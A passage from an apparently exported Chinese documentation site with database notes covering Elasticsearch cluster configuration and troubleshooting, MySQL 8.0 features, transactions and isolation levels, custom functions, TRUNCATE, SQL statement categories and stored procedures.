#(内网ip) http.port: 9393 #对外访问 transport.tcp.port: 9303 #各节点通信 --------------------------------- Discovery ---------------------------------- #Pass an initial list of hosts to perform discovery when new node is started: #The default list of hosts is [\"127.0.0.1\", \"[::1]\"] discovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"] #分别为各节点通信端口 副节点之一 elasticsearch.yml: cluster.name: test-master node.name: test-node2 #设置充当master节点，默认为true node.master: false #设置不充当data节点，默认为true node.data: true network.host: 192.168.1.1(内网ip) network.bind_host: 192.168.1.1(内网ip) http.port: 9394 #对外访问 transport.tcp.port: 9304 #各节点通信 --------------------------------- Discovery ---------------------------------- #Pass an initial list of hosts to perform discovery when new node is started: #The default list of hosts is [\"127.0.0.1\", \"[::1]\"] discovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"] #分别为各节点通信端口 副节点之二 elasticsearch.yml: cluster.name: test-master node.name: test-node3 # 设置充当master节点，默认为true node.master: false # 设置不充当data节点，默认为true node.data: true network.host: 192.168.1.1(内网ip) network.bind_host: 192.168.1.1(内网ip) http.port: 9395 #对外访问 transport.tcp.port: 9305 #各节点通信 # --------------------------------- Discovery ---------------------------------- # Pass an initial list of hosts to perform discovery when new node is started: # The default list of hosts is [\"127.0.0.1\", \"[::1]\"] discovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"] #分别为各节点通信端口 报错 [Cannot assign requested address: bind] 配置中的集群配置 discovery.zen.ping.unicast.hosts 的ip 跟当前本机的 network.host 不一致，果断把自己给坑了(-_-) （ 当然这是为了模拟集群而在一台机器上部署多个节点， 生产环境不推荐这么搞，为了数据安全以及性能提升，还是一机一节点的好 ） 单机部署还是绑定自己本地吧 报错master not discovered yet, this node has not previously joined a bootstrapped (v7+) cluster 下午、晚上都在报这个错， 最开始的yml配置文件是这个样子，我建立了一个不存储数据的master节点， 三个数据处理的node节点（node节点没有成为master的机会） 最开始，在文件配置中最重要的cluster.initial_master_nodes没有配置，导致无法绑定master节点，所以一直报错， 后指定了initial_master_nodes为四个节点，也在报错， 是因为只将第一个不存储数据的节点设置了node.master:true， 其他几个都设置的false，所以其他几个节点没有成为master节点的机会， 修改为cluster.initial_master_nodes: [\"127.0.0.1:9300\"]，问题解决一半， 因为只有master节点跟node1节点是正确的，另外两个节点还是在报错，正在寻找原因中。。。。 更新，原因找到了，master主节点没有实时去发现从节点，先把三个从节点启动了，最后再启动主节点就可以了， 更稳妥的解决方案是，在主节点上想方法设置一下实时从节点的发现。这一点明天继续寻找是否可以实现。 附主节点配置: #集群名，节点名 cluster.name: test-master node.name: test-node1 node.master: true #设置充当master节点，默认为true node.data: false #设置不充当data节点，默认为true network.host: 192.168.1.1 #(内网ip) network.bind_host: 192.168.1.1 #(内网ip) http.port: 9393 #对外访问 transport.tcp.port: 9303 #各节点通信 --------------------------------- Discovery ---------------------------------- #Pass an initial list of hosts to perform discovery when new node is started: #The default list of hosts is [\"127.0.0.1\", \"[::1]\"] discovery.seed_hosts: [\"127.0.0.1:9300\",\"127.0.0.1:9301\",\"127.0.0.1:9302\",\"127.0.0.1:9303\"] #分别为各节点通信端口 cluster.initial_master_nodes: [\"127.0.0.1:9300\"] 上面的基本信息介绍 可以看到有两个地址，{127.0.0.1:9300}和{127.0.0.1:9200}，相应的有两个端口号：9300和9200， 9300是端口transport端口号，9200是http端口号，详见：和 Elasticsearch 交互 验证ES是否启动成功：访问127.0.0.1:9200，看是否能访问成功~: { \"name\" : \"-WsJ6Vr\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"QKps9rpJQCiBJ4zBsXwgpQ\", \"version\" : { \"number\" : \"5.4.0\", \"build_hash\" : \"780f8c4\", \"build_date\" : \"2017-04-28T17:43:27.229Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.5.0\" }, \"tagline\" : \"You Know, for Search\" } 一个运行中的 Elasticsearch 实例称为一个\"节点\"， 而\"集群\"是由一个或者多个拥有相同 cluster.name 配置的节点组成 所以这就启动了一个ES节点，其中： name：表示这个ElasticSearch实例的名字； cluster_name：表示该节点所在的集群的名字，集群名相同的节点都会自动加入该集群； version：表示版本号，number是当前ES的版本号，lucene_version是当前ES所基于的Lucence的版本号 数据data缓存 默认情况下es的data都是存在于path.data所指定的目录的，path.data默认为文件的data目录， 所以data存在着上一次或者上几次的运行配置 故有些时候需要清空data来重新运行 Python版本 哭了，NS用的是python2.7，es导的es7.13的模块，而模块es7.13调用了urllib3的方法，最后urllib3只支持python3 是为什么发现这个问题的呢？ 因为外网机下载好es的python的模块之后安装到内网机，windows安装时报错缺少两个模块: certifi，urllib 然后去下载安装，成功，接着自己写了个测试使用，成功 然后接入数据库数据， debian安装es7，比win上多安装一个模块，因为装urllib3的时候提示报错， 查询后是setuptools版本过低，遂去找了适合python2的最新模块包， 报错找不到RecursionError， 然后在http_urllib3.py里也确实没有发现RecursionError是在哪里定义的， 然后去搜了urllib3这个模块，发现只支持python3 所以如果现在要改的话 要么把服务器python2.7升级，但是这样要改很多包 要么就把es7的模块给换了，本地集群的服务的得重新来，合着白装了这几个。。。 现在尝试，就未定义RecursionError这个错来修复，尝试注释之类的 嗯，注释了这个except，没报这个错了， 新的错误：虚拟机连接不上宿主机","tags":"数据库","url":"/yq-doc-source-docs-database-elasticsearch-ES-problems.html","loc":"/yq-doc-source-docs-database-elasticsearch-ES-problems.html"},{"title":"Mysql8.0新特性","text":"新增降序索引 MySQL在语法上很早就已经支持降序索引，但实际上创建的仍然是升序索引， 如下MySQL 5.7所示，c2字段降序， 但是从show create table看c2仍然是升序。8.0可以看到，c2字段降序。只有Innodb存储引擎支持降序索引。 group by不会自动排序 5.7中分组查询时, 会自动按照分组的字段排序, 8.0 中得手动 order by 增加隐藏索引 使用 invisible 关键字在创建表或者进行表变更中设置索引为隐藏索引。 索引隐藏只是不可见，但是数据库后台还是会维护隐藏索引的，在查询时优化器不使用该索引， 即使用force index，优化器也不会使用该索引，同时优化器也不会报索引不存在的错误， 因为索引仍然真实存在，必要时，也可以把隐藏索引快速恢复成可见。注意，主键不能设置为 invisible. 软删除就可以使用隐藏索引，比如我们觉得某个索引没用了，删除后发现这个索引在某些时候还是有用的， 于是又得把这个索引加回来，如果表数据量很大的话，这种操作耗费时间是很多的， 成本很高，这时，我们可以将索引先设置为隐藏索引，等到真的确认索引没用了再删除。 如创建t2表，里面的c2字段为隐藏索引: mysql › create table t2(c1 int, c2 int, index idx_c1(c1), index idx_c2(c2) invisible); 新增函数索引 之前我们知道，如果在查询中加入了函数，索引不生效， 所以MySQL 8引入了函数索引，MySQL 8.0.13开始支持在索引中使用函数（表达式）的值。 函数索引基于虚拟列功能实现，在MySQL中相当于新增了一个列， 这个列会根据你的函数来进行计算结果， 然后使用函数索引的时候就会用这个计算后的列作为索引。 如: # 给t3表的c1列创建普通索引 create index idx_c1 on t3(c1); # 给t3表的c2列创建函数索引, 大写函数索引 create index func_idx on t3((UPPER(c2))) 窗口函数（Window Functions）：也称分析函数 从 MySQL 8.0开始，新增了一个叫窗口函数的概念，它可以用来实现若干新的查询方式。 窗口函数与 SUM（）、COUNT（）这种分组聚合函数类似，在聚合函数后面加上over（）就变成窗口函数了， 在括号里可以加上partition by等分组关键字指定如何分组， 窗口函数即便分组也不会将多行查询结果合并为一行，而是将结果放回多行当中，即窗口函数不需要再使 GROUP BY. 示例 默认字符集由latin1变为utf8mb4 在8.0版本之前，默认字符集为latin1，utf8指向的是utf8mb3， 8.0版本默认字符集为utf8mb4，utf8默认指向的也是utf8mb4。 MyISAM系统表全部换成InnoDB表 将系统表（mysql）和数据字典表全部改为InnoDB存储引擎， 默认的MySQL实例将不包含MyISAM表，除非手动创建MyISAM表。 元数据存储变动 MySQL 8.0删除了之前版本的元数据文件，例如表结构.frm等文件，全部集中放入mysqlibd文件里。 自增变量持久化 在8.0之前的版本，自增主键 AUTO_INCREMENT 的值如果大于max（primary key）+1， 在MySQL重启后，会重置AUTO_INCREMENT=max（primary key）+1， 这种现象在某些情况下会导致业务主键冲突或者其他难以发现的问题。 注解 通俗点说, mysql不会记录已经被删除的主键, 比如有索引值: 1, 2, 3, 4, 5 删除了4和5, 重启后新增数据, 自增id会从 4 开始 而且如果手动把1, 更改为其他的比如6, 主键自增的当前最大值不会变, 后面再插入的时候就可能报错; Mysql8解决了这个问题, 会识别到最大自增id更新 自增主键重启重置的问题很早就被发现（ https://bugs.mysql.com/bug.php?id=199 ）， 一直到8.0才被解決，8.0版本将会对 AUTO_INCREMENT 值进行持久化，MySQL重启后，该值将不会改变。 innodb存储引擎select for update跳迹锁等待 对于 select … for share （8.0新增加查询共享锁的语法）或 select … for update ， 在语句后面添加 NOWAIT、 SKIP LOCKED 语法可以跳过锁等待，或者跳过锁定。 NOWAIT, 报错返回 SKIP LOCKED, 返回结果不包含加锁行 注解 select … for update 表示查询的时候加一个排他锁 在5.7及之前的版本，select.for update，如果获取不到锁，会一直等待，直到innodb_lock_wait_timeout超时。 在8.0版本，通过添加nowait，skip locked语法，能够立即返回。 如果查询的行已经加锁，那么nowait会立即报错返回，而skip locked也会立即返回，只是返回的结果中不包含被锁定的行。 应用场景比如查询余票记录，如果某些记录已经被锁定，用skip locked可以跳过被锁定的记录，只返回没有锁定的记录，提高系统性能。 新增innodb_dedicated_server自适应参数 能够让InnoDB根据服务器上检测到的内存大小自动配置innodb_buffer_pool_size, innodb_log_file_size等参数， 会尽可能多的占用系统可占用资源提升性能。 解决非专业人员安装数据库后默认初始化数据库参数默认值偏低的问题， 前提是服务器是专用来给MySQL数据库的，如果还有其他软件或者资源或者多实例MySQL使用，不建议开启该参数，不然会影响其它程序。 默认是OFF关闭: show variables like '%innodb_dedicated_server%'; 死锁检查控制 MySQL 8.0 （MySQL 5.7.15）增加了一个新的动态变量 innodb_dgadlock_detect， 用于控制系统是否执行 InnoDB死锁检查，默认是打开的。 死锁检测会耗费数据库性能的，对于高并发的系统，我们可以关闭死锁检测功能，提高系统性能。 但是我们要确保系统极少情况会发生死锁，同时要将锁等待超时参数调小一点，以防出现死锁等待过久的情况。 默认打开的: show variables like '%innodb_deadlock_detect%' undo文件不再使用系统表空间 默认创建2个UNDO表空间，不再使用系统表空间。 binlog日志过期时间精确到秒 之前是天，并且参数名称发生变化. 在8.0版本之前，binlog日志过期时间设置都是设置expire_logs_days参数， 而在8.0版本中，MySQL默认使用binlog_expire_logs_seconds参数。 DDL原子化 InnoDB表的DDL文持事务完整性，要么成功要么回滚。 MySQL 8.0开始支持原子DDL操作，其中与表相关的原子 DDL只支持 InnoDB 存储引擎。 一个原子 DDL 操作内容包括：更新数据字典，存储引擎层的操作，在 binlog 中记录 DDL 操作。 支持与表相关的DDL：数据库、表空间、表、索引的 CREATE、ALTER、DROP 以及 TRUNCATE TABLE。 比如删除两个表, 即使t2报错, t1也会被成功删除: drop tables t1, t2; 支持的其它DDL：存储程序、触发器、视图、UDF 的 CREATE、DROP 以及ALTER语句。 支持账户管理相关的 DDL：用户和角色的 CREATE、ALTER、DROP 以及适用的 RENAME等等。 参数修改持久化 MySQL 8.0版本支持在线修改全局参数并持久化，通过加上PERSIST关键字， 可以将修改的参数持久化到新的配置文件（mysqld-auto.cnf）中， 重启MySQL时，可以从该配置文件获取到最新的配置参数。set global 设置的变量参数在mysq重启后会失效。 系统会在数据目录下生成一个包含json格式的mysqld-auto.cnf 的文件, 当my.cnf 和mysqld-auto.cnf 同时存在时，后者具有更高优先级: set persist innodb_lock_wait_timeout=25;","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-8.0-new-features.html","loc":"/yq-doc-source-docs-database-mysql-8.0-new-features.html"},{"title":"事务","text":"Mysql事务四大特性ACID A (Atomicity): 原子性; 事务作为一个整体被执行，包含在其中的对数据库的操作要么全部被执行，要么都不执行; C (Consistency): 一致性; 指在事务开始之前和事务结束以后，数据不会被破坏，假如 A 账户给B 账户转 10块钱，不管成功与否，A和B的总金额是不变的; I (Isolation): 隔离性; 多个事务并发访问时，事务之间是相互隔离的，即一个事务不影响其它事务运行效果; D (Durability): 持久性 表示事务完成以后，该事务对数据库所作的操作更改，将持久地保存在数据库之中. 实现原理 事务的隔离性是通过数据库锁以及MVCC机制实现的; 事务的一致性由undo log来保证： undo log是逻辑日志，记录了事务的insert、update、delete操作， 回滚的时候做相反的delete、update、insert操作来恢复数据。 事务的原子性和持久性由redo log来保证： redo log被称作重做日志，是物理日志，事务提交的时候， 必须先将事务的所有日志写入redo log持久化，到事务的提交操作才算完成。 事务隔离级别 读未提交 读未提交，采取的是读不加锁原理。允许脏读 事务读不加锁，不阻塞其他事务的读和写 事务写阻塞其他事务写，但不阻塞其他事务读； 读未提交隔离级别，只限制了两个数据不能同时修改， 但是修改数据的时候，即使事务未提交， 都是可以被别的事务读取到的，这级别的事务隔离有脏读、重复读、幻读的问题； 读已提交 读已提交隔离级别，当前事务只能读取到其他事务提交的数据， 所以这种事务的隔离级别解决了脏读问题，但还是会存在重复读、幻读问题； 读取已提交和可重复读级别利用了ReadView和MVCC， 也就是每个事务只能读取它能看到的版本（ReadView）。 只能读取到已经提交的数据. READ COMMITTED：每次读取数据前都生成一个ReadView 可重复读(默认) 可重复读隔离级别，限制了读取数据的时候，不可以进行修改， 所以解决了重复读的问题，但是读取范围数据的时候，是可以插入数据，所以还会存在幻读问题； 可重复读. 读取已提交和可重复读级别利用了ReadView和MVCC， 也就是每个事务只能读取它能看到的版本（ReadView） REPEATABLE READ ：在事务里第一次读取数据时生成一个ReadView 串行化 事务最高的隔离级别，在该级别下，所有事务都是进行串行化顺序执行的。 可以避免脏读、不可重复读与幻读所有并发问题。但是这种事务隔离级别下，事务执行很耗性能。 串行化的实现采用的是读写都加锁的原理。 串行化的情况下，对于同一行事务，写会加写锁，读会加读锁。 当出现读写锁冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行。 数据库是如何保证事务的隔离性的呢？ 数据库是通过加锁，来实现事务的隔离性的。 加锁确实好使，可以保证隔离性。 比如串行化隔离级别就是加锁实现的。 但是频繁的加锁，导致读数据时，没办法修改，修改数据时，没办法读取，大大降低了数据库性能。 那么，如何解决加锁后的性能问题的？ 答案就是,MVCC多版本并发控制！ 它实现读取数据不用加锁，可以让读取数据同时修改。修改数据时同时可读取。 参见: /docs/数据库/mysql/MVCC 参考: https://juejin.cn/post/7016165148020703246 并发带来事物问题 丢失更新 A事务提交或撤销时, 把B事务给丢了 脏读 如果一个事务读取到了另一个未提交事务修改过的数据，我们就称发生了脏读现象。 不可重复读 同一个事务内，前后多次读取，读取到的数据内容不一致(其他事务的修改已经提交) 幻读 如果一个事务先根据某些搜索条件查询出一些记录， 在该事务未提交时， 另一个事务写入了一些符合那些搜索条件的记录（如insert、delete、update），就意味着发生了幻读。 事务优化 优化原则 在保证业务逻辑的前提下, 尽量缩短事务长度 大事务拆分为小事务 DDL拆分(无锁变更) 长事务合并为大事务 长事务分解(不必要的请求擦除) 应用保持一致性","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Affairs.html","loc":"/yq-doc-source-docs-database-mysql-Affairs.html"},{"title":"自定义函数","text":"可能会遇到内置函数 /docs/数据库/mysql/概念基础/函数API 满足不了使用场景的问题, 这时候自定义函数就有用了 自定义函数是一种与存储过程十分相似的过程式数据库对象。 它与存储过程一样，都是由 SQL 语句和过程式语句组成的代码片段，并且可以被应用程序和其他 SQL 语句调用。 自定义函数与存储过程之间存在几点区别： 自定义函数不能拥有输出参数，这是因为自定义函数自身就是输出参数；而存储过程可以拥有输出参数。 自定义函数中必须包含一条 RETURN 语句，而这条特殊的 SQL 语句不允许包含于存储过程中。 可以直接对自定义函数进行调用而不需要使用 CALL 语句，而对存储过程的调用需要使用 CALL 语句。 创建 语法: CREATE FUNCTION <函数名> ( [ <参数1> <类型1> [ , <参数2> <类型2>] ] … ) RETURNS <类型> <函数主体> 函数名: 应该合法的标识符，并且不应该与已有的关键字冲突, 包括已有函数名, 已有存储过程名称 一个函数应该属于某数据库，可以使用 db_name.funciton_name 的形式执行当前函数所属数据库, 否则默认为当前数据库。 参数列表: 可以有一个或者多个函数参数，甚至是没有参数也是可以的。对于每个参数，由参数名和参数类型组成。 返回值: 指明返回值类类型 函数体: 自定义函数的函数体由多条可用的MySQL语句，流程控制，变量声明等语句构成。 需要指明的是函数体中一定要含有return 返回语句。 注解 创建函数时, 若不指定库名, 会创建在当前库, 使用时也是 示例-无参函数: mysql> DROP FUNCTION IF EXISTS hello; Query OK, 0 rows affected, 1 warning (0.00 sec) mysql> DELIMITER $$ mysql> CREATE FUNCTION hello() -> RETURNS VARCHAR(255) -> BEGIN -> RETURN 'Hello world,i am mysql'; -> END $$ Query OK, 0 rows affected (0.11 sec) mysql> DELIMITER ; mysql> SELECT hello(); +-------------------------+ | hello() | +-------------------------+ | Hello world,i am mysql | +-------------------------+ 1 row in set (0.00 sec) 示例-含有参数的自定义函数: mysql> DELIMITER $$ mysql> DROP FUNCTION IF EXISTS test.formatDate $$ Query OK, 0 rows affected, 1 warning (0.07 sec) mysql> CREATE FUNCTION test.formatDate(fdate datetime) -> RETURNS VARCHAR(255) -> BEGIN -> DECLARE x VARCHAR(255) DEFAULT ''; -> SET x= date_format(fdate,'%Y年%m月%d日%h时%i分%s秒'); -> RETURN x; -> END $$ Query OK, 0 rows affected (0.11 sec) mysql> DELIMITER ; mysql> SELECT formatDate(now()); +----------------------------+ | formatDate(now()) | +----------------------------+ | 2014年11月21日03时41分21秒 | +----------------------------+ 1 row in set (0.18 sec) 查询自定义函数 查看数据库中存在哪些自定义函数: SHOW FUNCTION STATUS 若要查看数据库中某个具体的自定义函数: SHOW CREATE FUNCTION<函数名> 查看函数状态, 比如创建时间之类: SHOW FUCNTION STATUS LIKE '函数名' 其中<函数名>用于指定该自定义函数的名称。 修改自定义函数 修改函数相关特征: ALTER FUNCTION func_name [characteristic ...] characteristic: COMMENT 'string' | LANGUAGE SQL | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA } | SQL SECURITY { DEFINER | INVOKER } 上面这个语法结构是MySQL官方给出的，修改的内容可以包含SQL语句也可以不包含， 既可以是读数据的SQL也可以是修改数据的SQL还有权限。 此外在修改function的时候还需要注意你不能使用这个语句来修改函数的参数以及函数体， 如果你想改变这些的话你就需要删除掉这个函数然后重新创建。 例子: mysql> SELECT hello(); +-------------------------+ | hello() | +-------------------------+ | Hello world,i am mysql | +-------------------------+ 1 row in set (0.00 sec) mysql> ALTER FUNCTION hello -> -> READS SQL DATA -> COMMENT 'print hello'; Query OK, 0 rows affected (0.23 sec) mysql> SELECT SPECIFIC_NAME,SQL_DATA_ACCESS, -> ROUTINE_COMMENT FROM information_schema.Routines -> WHERE ROUTINE_NAME='hello'; +---------------+-----------------+-----------------+ | SPECIFIC_NAME | SQL_DATA_ACCESS | ROUTINE_COMMENT | +---------------+-----------------+-----------------+ | hello | READS SQL DATA | print hello | +---------------+-----------------+-----------------+ 1 row in set (0.21 sec) 若要修改自定义函数的内容，则需要先删除该自定义函数，然后重新创建。 参考: MySQL之自定义函数 删除自定义函数 自定义函数被创建后，一直保存在数据库服务器上以供使用，直至被删除。 删除自定义函数的方法与删除存储过程的方法基本一样，可以使用 DROP FUNCTION 语句来实现。 语法: DROP FUNCTION [ IF EXISTS ] <自定义函数名> 自定义函数相关语法及变量 变量声明 语法: DECLARE var_name[,...] type [DEFAULT value] 声明局部变量。要给变量提供一个默认值，请包含一个DEFAULT子句。 值可以被指定为一个表达式，不需要为一个常数。 如果没有DEFAULT子句，初始值为NULL。 使用语序使用 set 和 select into语句为变量赋值: set var_name = ''; IF 条件语句 语法: IF search_conditionTHEN statement_list [ELSEIF search_conditionTHENstatement_list] ... [ELSE statement_list] ENDIF; CASE语句 语法: CASE case_value WHEN when_valueTHENstatement_list [WHEN when_value THENstatement_list] ... [ELSE statement_list] END CASE; 循环语句 语法: While [begin_label:]WHILEsearch_conditionDO statement_list END WHILE [end_label]; 退出整个循环使用 leave, 相当于break 退出当前循环使用 iterate, 相当于 continue 通过退出的标签决定退出哪个循环。","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Functional-definition.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Functional-definition.html"},{"title":"关键字","text":"注解 Mysql一般都不区分大小写, 比如 desc 和 DESC 是一致的 DELIMITER 表示定义一个结束符, 默认是分号; 当我们使用命令行来定义函数时候, 函数内部的语句往往需要分号表示结束; 会与默认的分号冲突, 所以先定义一个其他的结束符, 再写函数; 如定义 // 为结束符: mysql> delimiter // mysql> CREATE FUNCTION `SHORTEN`(S VARCHAR(255), N INT) mysql> RETURNS varchar(255) mysql> BEGIN mysql> IF ISNULL(S) THEN mysql> RETURN ''; mysql> ELSEIF N<15 THEN mysql> RETURN LEFT(S, N); mysql> ELSE mysql> IF CHAR_LENGTH(S) <=N THEN mysql> RETURN S; mysql> ELSE mysql> RETURN CONCAT(LEFT(S, N-10), '...', RIGHT(S, 5)); mysql> END IF; mysql> END IF; mysql> END;// 另外, 用完后记得还原, 不然分号用不了: delimiter ; DESC DESCRIBE 的简写形式，用于获取表的结构信息。 DESC 或 DESCRIBE 命令用于检索指定表的列元数据， 包括列名、数据类型、约束条件等。它提供了有关表的结构的详细信息，帮助您了解表的字段及其属性。 以下是使用 DESC 命令的一般语法: DESC $table_name; 其中，table_name 是要描述的表的名称。 返回一个结果集 Field：列名 Type：列的数据类型 Null：指示列是否允许 NULL 值 Key：指示列是否为主键或索引的一部分 Default：列的默认值 Extra：其他列属性，例如自动递增、注释等。 DELIMITER 定义分隔符 DEFAULT 可以用在, 当插入数据时, 不想手动写主键的值, 就可以给default.","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Keyword.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Keyword.html"},{"title":"关键字-truncate","text":"truncate truncate使用语法 truncate的作用是清空表或者说是截断表，只能作用于表。 truncate的语法很简单，后面直接跟表名即可，例如: truncate table tbl_name 或者 truncate tbl_name 。 执行truncate语句需要拥有表的drop权限，从逻辑上讲， truncate table类似于delete删除所有行的语句 或 drop table 然后再 create table 语句的组合。 为了实现高性能，它绕过了删除数据的DML方法，因此，它不能回滚。 尽管truncate table与delete相似，但它被分类为DDL语句而不是DML语句。 truncate与drop,delete的对比 上面说过truncate与delete，drop很相似，其实这三者还是与很大的不同的，下面简单对比下三者的异同。 truncate与drop是DDL语句，执行后无法回滚； delete是DML语句，可回滚。 truncate只能作用于表；delete，drop可作用于表、视图等。 truncate会清空表中的所有行，但表结构及其约束、索引等保持不变； drop会删除表的结构及其所依赖的约束、索引等。 truncate会重置表的自增值；delete不会。 truncate不会激活与表有关的删除触发器；delete可以。 truncate后会使表和索引所占用的空间会恢复到初始大小； delete操作不会减少表或索引所占用的空间，drop语句将表所占用的空间全释放掉。 truncate使用场景及注意事项 通过前面介绍，我们很容易得出truncate语句的使用场景，即该表数据完全不需要时可以用truncate。 如果想删除部分数据用delete，注意带上where子句； 如果想删除表，当然用drop； 如果想保留表而将所有数据删除且和事务无关，用truncate即可； 如果和事务有关，或者想触发trigger，还是用delete； 如果是整理表内部的碎片，可以用truncate然后再重新插入数据。 无论怎样，truncate表都是高危操作，特别是在生产环境要更加小心，下面列出几点注意事项，希望大家使用时可以做下参考。 truncate无法通过binlog回滚。 truncate会清空所有数据且执行速度很快。 truncate不能对有外键约束引用的表使用。 执行truncate需要drop权限，不建议给账号drop权限。 执行truncate前一定要再三检查确认，最好提前备份下表数据。","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Keyword-Truncate.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-Keyword-Truncate.html"},{"title":"SQL四种语言: DDL,DML,DCL,TCL","text":"参考: SQL四种语言：DDL,DML,DCL,TCL DDL(Data Definition Language) 数据库定义语言(statements are used to define the database structure or schema.) DDL是 SQL 语言的四大功能之一。 用于定义数据库的三级结构， 包括外模式、概念模式、内模式及其相互之间的映像，定义数据的完整性、安全控制等约束 适用范围：对数据库中的某些对象(例如，database,table)进行管理，如: CREATE ALTER DROP TRUNCATE COMMENT RENAME 举例, 创建数据库: create database IF NOT EXISTS hncu CHARACTER SET utf8; 创建表格: use hncu; create table IF NOT EXISTS stud( id int, name varchar(30), age int ); 更改表结构(设置约束): desc stud; //查看表结构 alter table stud drop column age; alter table stud add column age int; 删除表、删除数据库: drop table stud; drop database hncu; DML(Data Manipulation Language) 数据操纵语言 (statements are used for managing data within schema objects.) 由DBMS提供，用于让用户或程序员使用，实现对数据库中数据的操作。 DML分成交互型DML和嵌入型DML两类。 依据语言的级别，DML又可分成过程性DML和非过程性DML两种。 适用范围：对数据库中的数据进行一些简单操作，如: SELECT INSERT UPDATE DELETE MERGE CALL EXPLAIN PLAN LOCK TABLE 主要指数据的增删查改: Select/delete/update/insert/call select * from stud; select name,age from stud; //查询指定的列 select name as 姓名, age as 年龄 from stud; DCL(Data Control Language) 数据库控制语言授权，角色控制等 GRANT 授权 REVOKE 取消授权 TCL(Transaction Control Language) 事务控制语言 SAVEPOINT 设置保存点 ROLLBACK 回滚 SET TRANSACTION SQL主要分成四部分 数据定义。（SQL DDL）用于定义SQL模式、基本表、视图和索引的创建和撤消操作。 数据操纵。（SQL DML）数据操纵分成数据查询和数据更新两类。数据更新又分成插入、删除、和修改三种操作。 数据控制。包括对基本表和视图的授权，完整性规则的描述，事务控制等内容。 嵌入式SQL的使用规定。涉及到SQL语句嵌入在宿主语言程序中使用的规则。","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-SQL-four-languages-DDL,-DML,-DCL,-TCL.html","loc":"/yq-doc-source-docs-database-mysql-Conceptual-foundation-SQL-four-languages-DDL,-DML,-DCL,-TCL.html"},{"title":"存储过程","text":"MySQL5.0 版本开始支持存储过程。 如果在实现用户的某些需求时，需要编写一组复杂的SQL语句才能实现， 那么我们就可以将这组复杂的SQL语句集提前编写在数据库中， 由JDBC调用来执行这组SQL语句。 把编写在数据库中的SQL语句集称为存储过程。 存储过程（PROCEDURE） 事先经过编译并存储在数据库中的一段SQL语句的集合。 调用存储过程可以简化应用开发人员的很多工作， 减少数据在数据库和应用服务器之间的传输，对于提高数据处理的效率是很有好处的 简单理解就是数据库 SQL 语言层面的代码封装与重用。 类似于Java中的方法，需要先定义，使用时需要调用。 存储过程可以定义参数，参数分为IN、OUT、INOUT类型三种类型 IN类型的参数表示接受调用者传入的数据； OUT类型的参数表示向调用者返回数据； INOUT类型的参数即可以接受调用者传入的参数，也可以向调用者返回数据。 优点 存储过程可封装，并隐藏复杂的商业逻辑。 存储过程可以回传值，并可以接受参数。 存储过程无法使用 SELECT 指令来运行，因为它是子程序，与查看表，数据表或用户定义函数不同。 存储过程可以用在数据检验，强制实行商业逻辑等。 缺点 存储过程，往往定制化于特定的数据库上，因为支持的编程语言不同。 当切换到其他厂商的数据库系统时，需要重写原有的存储过程。 存储过程的性能调校与撰写，受限于各种数据库系统。 编写 基本语句格式: DELIMITER $$ CREATE /*[DEFINER = { user | CURRENT_USER }]*/ PROCEDURE 数据库名.存储过程名([in变量名 类型,out 参数 2，...]) /*LANGUAGE SQL | [NOT] DETERMINISTIC | { CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA } | SQL SECURITY { DEFINER | INVOKER } | COMMENT 'string'*/ BEGIN [DECLARE 变量名 类型 [DEFAULT 值];] 存储过程的语句块; END$$ DELIMITER ; 存储过程中的语句必须包含在BEGIN和END之间 DECLARE中用来声明变量，变量默认赋值使用的DEFAULT，语句块中改变变量值，使用SET 变量=值； 存储位置 存储过程的信息都存储在 information_schema 数据库下的 Routines 表中， 可以通过查询该表的记录来查询存储过程的信息，SQL 语句如下: SELECT * FROM information_schema.Routines WHERE ROUTINE_NAME=存储过程名; 参考: MySQL查看存储过程 调用 语法: CALL 数据库名.存储过程名(参数列表); 示例: DELIMITER $$ CREATE PROCEDURE `demo`.`demo2`(IN s_sex CHAR(1),OUT s_count INT) -- 存储过程体 BEGIN -- 把SQL中查询的结果通过INTO赋给变量 SELECT COUNT(*) INTO s_count FROM student WHERE sex= s_sex; SELECT s_count; END$$ DELIMITER ; 调用这个存储过程: -- @s_count表示测试出输出的参数 CALL demo2 ('男',@s_count); 存储过程管理 显示: SHOW PROCEDURE STATUS 显示特定数据库的存储过程: SHOW PROCEDURE STATUS WHERE db = 'db名字' AND NAME = 'name名字'; 显示特定模式的存储过程: SHOW PROCEDURE STATUS WHERE NAME LIKE '%mo%'; 显示存储过程的源码: SHOW CREATE PROCEDURE 存储过程名; 删除存储过程: DROP PROCEDURE 存储过程名; 流程控制语句 IF ELSE IF 语句包含多个条件判断，根据结果为 TRUE、FALSE执行语句， 与编程语言中的 if、else if、else 语法类似: DELIMITER $$ CREATE PROCEDURE `demo`.`demo3`(IN `day` INT) -- 存储过程体 BEGIN IF `day` = 0 THEN SELECT '星期天'; ELSEIF `day` = 1 THEN SELECT '星期一'; ELSEIF `day` = 2 THEN SELECT '星期二'; ELSE SELECT '无效日期'; END IF; END$$ DELIMITER ; 条件控制语句 CASE 类似于Java的 switch() case , 不过Mysql中, 是 case xx when 类似IF的调用: DELIMITER $$ CREATE PROCEDURE demo4(IN num INT) BEGIN CASE -- 条件开始 WHEN num<0 THEN SELECT '负数'; WHEN num>0 THEN SELECT '正数'; ELSE SELECT '不是正数也不是负数'; END CASE; -- 条件结束 END$$ DELIMITER; 类似Java的switch调用: DELIMITER $$ CREATE PROCEDURE demo5(IN num INT) BEGIN CASE num 